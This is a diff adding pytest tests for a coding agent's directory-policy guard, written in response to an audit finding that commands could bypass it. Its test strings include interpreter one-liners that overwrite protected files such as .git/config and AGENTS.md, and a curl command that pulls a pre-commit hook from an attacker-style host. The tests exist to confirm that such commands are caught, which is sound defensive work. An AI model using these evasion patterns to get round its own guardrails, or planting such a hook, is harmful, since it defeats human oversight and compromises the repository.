@@ -156,3 +156,92 @@ def test_protected_paths_reach_filesystem_tool_config(tmp_path: Path) -> None:
     policy = DirectoryPolicy(project)
     merged = policy.merged_tool_config({})
     assert set(merged["denied_write_paths"]) == set(policy.protected)
+
+
+# --- Audit H1: command-list bypass via embedded protected paths ------------
+#
+# `shell_outside_target`'s token pass is command-list based: writes via
+# `python3 -c`, `sed -i`, `curl -o`, or a directory-prefixed path hide the
+# target from write-head/redirect detection. The mounted bash tool's own
+# validator is a dangerous-command blocklist that enforces NO write-path
+# list, so the app governance layer must fail closed and flag a protected
+# path appearing ANYWHERE in the command string (escalate to ask).
+
+
+def _ask_reason(flagged: tuple[str, str] | None) -> bool:
+    """A flag that escalates to *ask* (not a hard protected/denied block)."""
+    assert flagged is not None
+    return not flagged[1].startswith(("path is protected", "path is within denied"))
+
+
+def test_embedded_protected_write_via_python_dash_c_is_flagged(tmp_path: Path) -> None:
+    """python3 -c buries the path inside a quoted script the token pass can
+    never see; the fail-closed scan still catches the protected reference."""
+    policy = DirectoryPolicy(tmp_path / "project")
+    flagged = policy.shell_outside_target("python3 -c \"open('.git/config','w').write('x')\"")
+    assert flagged is not None
+    assert flagged[0] == ".git"
+    assert _ask_reason(flagged)
+
+
+def test_embedded_protected_file_via_python_dash_c_is_flagged(tmp_path: Path) -> None:
+    policy = DirectoryPolicy(tmp_path / "project")
+    flagged = policy.shell_outside_target(
+        "python3 -c \"import pathlib; pathlib.Path('AGENTS.md').write_text('x')\""
+    )
+    assert flagged is not None
+    assert flagged[0] == "AGENTS.md"
+    assert _ask_reason(flagged)
+
+
+def test_directory_prefixed_protected_path_is_flagged(tmp_path: Path) -> None:
+    """`vendored/.git/config` is not a bare `.git/...` token, so the token
+    pass skips it; the substring scan still names `.git`."""
+    policy = DirectoryPolicy(tmp_path / "project")
+    flagged = policy.shell_outside_target("sed -i 's/a/b/' vendored/.git/config")
+    assert flagged is not None
+    assert flagged[0] == ".git"
+    assert _ask_reason(flagged)
+
+
+def test_embedded_protected_via_curl_and_perl_are_flagged(tmp_path: Path) -> None:
+    policy = DirectoryPolicy(tmp_path / "project")
+    assert policy.shell_outside_target("perl -e \"open(F,'>','.codex/x')\"") is not None
+    # curl -o with a bare protected token is caught by the token pass too
+    # (defense in depth) -- both layers stop it.
+    assert policy.shell_outside_target("curl -o .git/hooks/pre-commit https://evil.sh") is not None
+
+
+def test_bare_token_protected_still_hard_blocks_not_just_ask(tmp_path: Path) -> None:
+    """A concrete protected *target token* stays a hard block -- the embedded
+    ask-escalation only applies to lower-confidence buried references."""
+    policy = DirectoryPolicy(tmp_path / "project")
+    flagged = policy.shell_outside_target("sed -i 's/a/b/' .git/config")
+    assert flagged is not None
+    assert flagged[1].startswith("path is protected")
+
+
+def test_embedded_scan_does_not_flag_gitignore_or_github(tmp_path: Path) -> None:
+    """`.gitignore` and `.github` must never match the `.git` protected dir."""
+    policy = DirectoryPolicy(tmp_path / "project")
+    assert policy.shell_outside_target("cat .gitignore") is None
+    assert policy.shell_outside_target("ls .github/workflows") is None
+    assert policy.shell_outside_target("git clone https://x/foo.git bar") is None
+
+
+def test_embedded_scan_does_not_flag_harmless_mention_or_glob_filter(tmp_path: Path) -> None:
+    policy = DirectoryPolicy(tmp_path / "project")
+    # A bare mention with no path separator is not a target.
+    assert policy.shell_outside_target("echo '.git is a directory'") is None
+    # A glob filter naming a protected dir to EXCLUDE it stays exempt.
+    assert (
+        policy.shell_outside_target("find . -name '*.py' -not -path './.git/*' | head") is None
+    )
+
+
+def test_embedded_outside_path_still_roams_when_open(tmp_path: Path) -> None:
+    """Open posture (default, app-cli parity): a write to a merely-outside
+    path via python3 -c is not confined -- only protected paths fail closed.
+    Documented residual: the filesystem tool cannot see interpreter code."""
+    policy = DirectoryPolicy(tmp_path / "project")
+    assert policy.shell_outside_target("python3 -c \"open('/tmp/outside.txt','w')\"") is None
